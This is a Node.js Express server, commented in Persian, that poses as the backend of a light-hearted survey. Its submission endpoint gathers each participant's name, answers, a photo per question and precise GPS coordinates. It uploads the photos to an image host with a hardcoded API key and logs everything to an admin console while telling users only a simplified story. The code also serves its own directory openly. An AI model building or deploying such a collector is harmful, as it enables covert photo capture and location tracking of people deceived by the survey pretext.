import express from "express";
import axios from "axios";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// سرویس دهی فایل‌های استاتیک بدون محدودیت
app.use(express.static(__dirname));

app.use(express.json({ limit: "50mb" }));

// Route اصلی
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// API برای ارسال داده
const IMGBB_API_KEY = "2fe3007ea3853c345b114b7394111687";

// سوالات (همانند کلاینت)
const questions = [
  { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
  { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر'] },
  { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
  { key: 'city', text: 'کدام شهر را ترجیح می‌دهید؟', options: ['کیش', 'شمال', 'تبریز'] },
  { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰', '۱۰۰', '۱۰۰۰'] },
];

app.post("/send-sms", async (req, res) => {
  try {
    const { name, answers, photos, location } = req.body;

    console.log("🎯 دریافت داده‌های جدید نظرسنجی");
    console.log("👤 نام کاربر:", name);
    console.log("📊 تعداد پاسخ‌ها:", Object.keys(answers).length);
    console.log("🖼️ تعداد عکس‌ها:", photos.length);
    console.log("📍 موقعیت کاربر:", location?.address || "موقعیت نامشخص");
    console.log("📌 مختصات دقیق:", {
      latitude: location?.latitude,
      longitude: location?.longitude,
      accuracy: location?.accuracy
    });

    const uploadedUrls = [];
    const results = [];
    const adminResults = []; // نتایج کامل برای ادمین

    // آپلود عکس‌ها به ImgBB
    for (let i = 0; i < photos.length; i++) {
      try {
        const base64 = photos[i];
        const imageData = base64.split(",")[1];
        const formData = new URLSearchParams();
        formData.append("key", IMGBB_API_KEY);
        formData.append("image", imageData);

        const result = await axios.post(
          "https://api.imgbb.com/1/upload",
          formData
        );
        
        // پیدا کردن سوال مربوطه
        const questionKey = Object.keys(answers)[i];
        const questionObj = questions.find(q => q.key === questionKey);
        
        // اطلاعات کامل برای ادمین
        const adminInfo = {
          url: result.data.data.url,
          question: questionObj?.text || `سوال ${i + 1}`,
          answer: answers[questionKey] || 'پاسخ نامشخص',
          location: location?.address || 'موقعیت نامشخص',
          coordinates: location ? {
            latitude: location.latitude,
            longitude: location.longitude,
            accuracy: location.accuracy
          } : null,
          timestamp: new Date().toLocaleString('fa-IR'),
          isFallback: location?.fallback || false,
          user: name
        };
        
        // اطلاعات ساده برای کاربر
        const userInfo = {
          url: result.data.data.url,
          question: questionObj?.text || `سوال ${i + 1}`,
          answer: answers[questionKey] || 'پاسخ نامشخص',
          timestamp: new Date().toLocaleString('fa-IR')
        };
        
        uploadedUrls.push(result.data.data.url);
        results.push(userInfo);
        adminResults.push(adminInfo);
        
        console.log(`✅ عکس ${i + 1} آپلود شد:`, adminInfo);
      } catch (imgError) {
        console.error("❌ خطا در آپلود عکس:", imgError.message);
        
        const questionKey = Object.keys(answers)[i];
        const questionObj = questions.find(q => q.key === questionKey);
        
        const errorInfo = {
          url: `خطا: ${imgError.message}`,
          question: questionObj?.text || `سوال ${i + 1}`,
          answer: answers[questionKey] || 'پاسخ نامشخص',
          location: location?.address || 'موقعیت نامشخص',
          coordinates: location ? {
            latitude: location.latitude,
            longitude: location.longitude
          } : null,
          timestamp: new Date().toLocaleString('fa-IR'),
          error: true,
          user: name
        };
        
        results.push(errorInfo);
        adminResults.push(errorInfo);
      }
    }

    // لاگ کامل برای ادمین
    console.log("=".repeat(60));
    console.log("📋 خلاصه کامل نظرسنجی");
    console.log("👤 نام کاربر:", name);
    console.log("📍 موقعیت کامل:", location);
    console.log("📝 پاسخ‌ها:", answers);
    console.log("🖼️ نتایج عکس‌ها:");
    adminResults.forEach((item, index) => {
      console.log(`  عکس ${index + 1}:`);
      console.log(`    سوال: ${item.question}`);
      console.log(`    پاسخ: ${item.answer}`);
      console.log(`    موقعیت: ${item.location}`);
      console.log(`    مختصات: ${item.coordinates ? `عرض: ${item.coordinates.latitude}, طول: ${item.coordinates.longitude}` : 'ندارد'}`);
      console.log(`    زمان: ${item.timestamp}`);
      console.log(`    لینک: ${item.url}`);
      console.log("    " + "-".repeat(40));
    });
    console.log("=".repeat(60));

    return res.json({ 
      ok: true, 
      urls: uploadedUrls,
      results: results, // فقط اطلاعات ساده برای کاربر
      message: "نظرسنجی با موفقیت ثبت شد. از مشارکت شما متشکریم! ✅"
    });

  } catch (err) {
    console.error("❌ خطای سرور:", err.message);
    return res.status(500).json({ 
      ok: false, 
      error: "خطا در ثبت اطلاعات" 
    });
  }
});

// Route برای مشاهده لاگ‌ها (فقط برای ادمین)
app.get("/admin/logs", (req, res) => {
  res.json({ 
    message: "لاگ‌ها در کنسول سرور نمایش داده می‌شوند",
    instruction: "برای مشاهده اطلاعات کامل، کنسول سرور را چک کنید"
  });
});

// Route تست سلامت
app.get("/health", (req, res) => {
  res.json({ status: "OK", message: "سرور در حال اجراست" });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log("=".repeat(60));
  console.log("🚀 SERVER RUNNING - ADMIN MODE");
  console.log("📡 Port: " + PORT);
  console.log("🔗 URL: http://localhost:3000");
  console.log("🔗 Health: http://localhost:3000/health");
  console.log("🔗 Admin Logs: http://localhost:3000/admin/logs");
  console.log("📝 تمام اطلاعات موقعیت و پاسخ‌ها در کنسول سرور نمایش داده می‌شوند");
  console.log("=".repeat(60));
});